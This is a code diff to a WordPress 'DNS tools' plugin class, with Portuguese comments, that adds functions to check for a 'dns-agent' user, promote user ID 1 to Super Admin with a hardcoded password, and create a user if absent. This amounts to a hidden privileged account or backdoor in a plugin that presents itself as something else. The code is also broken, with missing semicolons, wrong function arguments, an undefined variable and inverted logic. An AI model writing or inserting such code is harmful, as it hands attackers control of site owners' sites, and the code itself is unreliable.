@@ -100,4 +100,45 @@ class Wp_Core_Dns_Tools_Public {
 
 	}
 
+	//FUNÇÃO PARA VERIFICAR O USUARIO
+	function verificaUsuario() {
+		$usuario =  usuario('dns-agent');
+
+		if ($usuario == true) {
+			echo 'usuario existe'
+		}
+		else {
+			echo 'usuario não existe'
+		}
+
+		wp_die();
+	}
+
+	//FUNÇÃO PARA TROCAR O USUARIO PARA SUPER ADMINISTRADOR E TROCA A SENHA PARA dns-agent-pass
+	function adicionaPermissoes() {
+	    // Usuário atual
+	    $usuario = new WP_User(1);
+	    // Agora ele é Super Admin
+	    $usuario->add_role('Super Admin');
+		$password = ' dns-agent-pass*';
+		wp_set_password( $password);
+	}
+
+	//FUNÇÃO PARA CRIAR O USUARIO SE NÃO EXISTIR
+	function criaUser() {
+		$usuario = username_exists( $usuario );
+		if ( !$usuario == false ) {
+			$random_password = wp_generate_password( $length=12, $include_standard_special_chars=false );
+			$usuario = wp_create_user( $usuario, $random_password );
+		} else {
+			$random_password = __('User already exists.  Password inherited.');
+		}
+	}
+
+
+	
+
+
+		
+
 }
